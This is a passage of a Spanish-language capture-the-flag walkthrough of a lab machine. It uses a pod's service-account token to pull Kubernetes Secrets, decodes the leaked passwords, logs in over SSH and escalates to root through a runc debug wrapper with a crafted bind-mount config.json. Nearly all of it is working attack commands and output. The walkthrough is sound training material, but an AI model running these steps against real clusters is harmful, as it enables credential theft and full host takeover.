Ese dominio ya lo vimos cuando consultamos las variables de entorno, pues es lo primero que nos aparece.

Carguemos como variable el contenido del token y luego hagamos una consulta hacia la ruta del recurso **Secrets**:
```bash
/var/www/html/cgi-bin # TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token)
/var/www/html/cgi-bin # curl -sSk -H "Authorization: Bearer $TOKEN" https://10.43.0.1/api/v1/namespaces/default/secrets | jq -r '.items[].metadata.name'
beta-vino-wp-mariadb
beta-vino-wp-wordpress
sh.helm.release.v1.beta-vino-wp.v58
sh.helm.release.v1.beta-vino-wp.v59
sh.helm.release.v1.beta-vino-wp.v60
sh.helm.release.v1.beta-vino-wp.v61
sh.helm.release.v1.beta-vino-wp.v62
sh.helm.release.v1.beta-vino-wp.v63
sh.helm.release.v1.beta-vino-wp.v64
sh.helm.release.v1.beta-vino-wp.v65
sh.helm.release.v1.beta-vino-wp.v66
sh.helm.release.v1.beta-vino-wp.v67
user-secret-babywyrm
user-secret-margotrobbie
user-secret-sydneysweeney
```
Excelente, funcionó. Tenemos acceso directo a la **API** y sus recursos.

Al final vemos los recursos **Secrets** de 3 usuarios, pero de quién debemos enfocarnos es del **usuario babywyrm**, pues al consultar su recurso, es el único que tiene el rol **MASTERPASS**:
```bash
/var/www/html/cgi-bin # curl -sSk -H "Authorization: Bearer $TOKEN" https://10.43.0.1/api/v1/namespaces/default/secrets/user-secret-babywyrm
{
  "kind": "Secret",
  "apiVersion": "v1",
  "metadata": {
    "name": "user-secret-babywyrm",
...
"managedFields": [
      {
        "manager": "controller",
        "operation": "Update",
        "apiVersion": "v1",
        "time": "2025-11-09T14:06:52Z",
        "fieldsType": "FieldsV1",
        "fieldsV1": {
          "f:data": {
            ".": {},
            "f:MASTERPASS": {}
          },
...
"data": {
    "USER_PASSWORD": "eXQ1TXpWZWk0bEdQb09uOUpMbDJPTlZ0NlFpWU9Zb3M="
  },
  "type": "Opaque"
}
```
Al final encontramos su contraseña, que por su sintaxis, parece estar codificada en **base64**.

Decodifiquémosla:
```bash
echo -n "eXQ1TXpWZWk0bEdQb09uOUpMbDJPTlZ0NlFpWU9Zb3M=" | base64 -d
yt5MzVei4lGPoOn9JLl2ONVt6QiYOYos
```

Y probemos si funciona para darnos acceso a la máquina víctima vía **SSH**:
```bash
ssh babywyrm@10.10.11.94
babywyrm@10.10.11.94's password:
...
Last login: Sun Nov 9 22:36:53 2025
babywyrm@giveback:~$ whoami
babywyrm
```
Genial, estamos dentro de la máquina principal.

Aquí encontramos la flag del usuario:
```bash
babywyrm@giveback:~$ cat user.txt
...
```

## Post Explotación {#Post}

### Creando una Montura del Directorio root para Escalar Privilegios (CVE-2019-5736 - CVE-2024-21626) {#runC}

Veamos qué privilegios tiene nuestro usuario:
```bash
babywyrm@giveback:~$ sudo -l
Matching Defaults entries for babywyrm on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, timestamp_timeout=0, timestamp_timeout=20

User babywyrm may run the following commands on localhost:
    (ALL) NOPASSWD: !ALL
    (ALL) /opt/debug
```
Podemos ejecutar el binario debug como **Root**.

Pero, observa lo que pasa cuando intentamos ejecutarlo:
```bash
babywyrm@giveback:~$ sudo /opt/debug
[sudo] password for babywyrm: 
[*] Validating sudo privileges...
[*] Sudo validation successful
Please enter the administrative password:
```
Nos esta pidiendo una contraseña.

Si probamos la de nuestro usuario y la de otros usuarios, no funcionara.

Sin embargo, al momento de consultar los **Secrets**, vemos en la parte de arriba que se mencionan los servicios **MariaDB y WordPress**.

Primero consultemos los **Secrets** del **servicio MariaDB**:
```bash
/var/www/html/cgi-bin # curl -sSk -H "Authorization: Bearer $TOKEN" https://10.43.0.1/api/v1/namespaces/default/secrets/beta-vino-wp-mariadb
...
  },
  "data": {
    "mariadb-password": "c1c1c3A0c3BhM3U3Ukx5ZXRyZWtFNG9T",
    "mariadb-root-password": "c1c1c3A0c3lldHJlMzI4MjgzODNrRTRvUw=="
  },
  "type": "Opaque"
}
```
Tenemos dos hashes que parecen estar codificados en **base64**.

Decodifiquémoslos:
```bash
echo -n "c1c1c3A0c3BhM3U3Ukx5ZXRyZWtFNG9T" | base64 -d
sW5sp4spa3u7RLyetrekE4oS                                                                                                                                                                                              

echo -n "c1c1c3A0c3lldHJlMzI4MjgzODNrRTRvUw==" | base64 -d
sW5sp4syetre32828383kE4oS
```
Tenemos dos contraseñas.

Al momento de probarlas, la contraseña que funciona es la de **mariadb-password**:
```bash
babywyrm@giveback:~$ sudo /opt/debug
[sudo] password for babywyrm: 
[*] Validating sudo privileges...
[*] Sudo validation successful
Please enter the administrative password: 

[*] Administrative password verified
Error: No command specified. Use '/opt/debug --help' for usage information.
```

++++**NOTA**: Esta parte de la sección aún esta en pruebas.+++++

Obtengamos más información del binario con la flag `--help`:
```bash
babywyrm@giveback:~$ sudo /opt/debug --help
[*] Validating sudo privileges...
[*] Sudo validation successful
Please enter the administrative password: 

[*] Administrative password verified
[*] Processing command: --help
Restricted runc Debug Wrapper

Usage:
  /opt/debug [flags] spec
  /opt/debug [flags] run <id>

Flags:
  --log <file>
  --root <path>
  --debug
```
Indica que es el binario **runc Debug Wrapper**.

Si investigamos este binario, resulta que tiene una vulnerabilidad que nos permite crear monturas de la máquina completa, siendo el **CVE-2019-5736** y **CVE-2024-21626**.

Aquí te comparto unos blogs que te ayudaran a entender la vulnerabilidad:
* <a href="https://ancat.github.io/exploitation/2019/02/16/cve-2019-5736.html" target="_blank">Exploiting CVE-2019-5736 to Escalate Privileges</a>
* <a href="https://nitroc.org/en/posts/cve-2024-21626-illustrated/#exploit-via-setting-working-directory-to-procselffdfd" target="_blank">Illustrate runC Escape Vulnerability CVE-2024-21626</a>
* <a href="https://angelica.gitbook.io/hacktricks/linux-hardening/privilege-escalation/runc-privilege-escalation" target="_blank">RunC Privilege Escalation</a>
* <a href="https://medium.com/@avijitsarkar123/docker-and-oci-runtimes-a9c23a5646d6" target="_blank">Docker and OCI Runtimes</a>

La idea es que podamos realizar la montura del directorio `/root` para poder ver cualquier archivo privilegiado.

Para hacerlo, primero crearemos un directorio de pruebas y crearemos el archivo **config.json** que será quien tenga la vulnerabilidad que nos permita crear la montura:
```bash
babywyrm@giveback:~$ cd /tmp
babywyrm@giveback:/tmp$ mkdir test
babywyrm@giveback:/tmp$ cd test/
babywyrm@giveback:/tmp/test$ sudo /opt/debug spec
[*] Validating sudo privileges...
[*] Sudo validation successful
Please enter the administrative password: 

[*] Administrative password verified
[*] Processing command: spec
```
Con el último comando, se crea el archivo **config.json**.

Dentro de este archivo, agregaremos las siguientes instrucciones que permitiran la montura:
```bash
{"destination": "/bin","type": "bind", "source": "/bin", "options": ["ro","rbind","rprivate"]},
{"destination": "/sbin", "type": "bind", "source": "/sbin", "options": ["ro","rbind","rprivate"]},
{"destination": "/lib", "type": "bind", "source": "/lib", "options": ["ro","rbind","rprivate"]},
{"destination": "/lib64", "type": "bind", "source": "/lib64", "options": ["ro","rbind","rprivate"]},
{"destination": "/usr/lib", "type": "bind", "source": "/usr/lib", "options": ["ro","rbind","rprivate"]},
{"destination": "/proc", "type": "proc", "source": "proc"},
{"destination": "/dev", "type": "tmpfs", "source": "tmpfs"},
{"destination": "/root", "type": "bind", "source": "/root", "options": ["bind","rw"]},
{"destination": "/usr", "type": "bind", "source": "/usr", "options": ["bind","ro"]},
{"destination": "/etc", "type": "bind", "source": "/etc", "options": ["bind","ro"]},
{"destination": "/dev/pts", "type": "devpts", "source": "devpts", "options": ["newinstance","ptmxmode=0666"]}
```

```bash
babywyrm@giveback:/tmp/test$ vim config.json 
babywyrm@giveback:/tmp/test$ mkdir -p rootfs/bin rootfs/usr/bin rootfs/sbin rootfs/usr/sbin rootfs/lib rootfs/lib64 rootfs/usr/lib rootfs/root rootfs/host_root
```

Ejecutamos nuestro archivo:
```bash
babywyrm@giveback:/tmp/test$ sudo /opt/debug run demo
[*] Validating sudo privileges...
[*] Sudo validation successful
Please enter the administrative password: 

[*] Administrative password verified
[*] Processing command: run
[*] Starting container: demo
# cat /root/root.txt
...
```
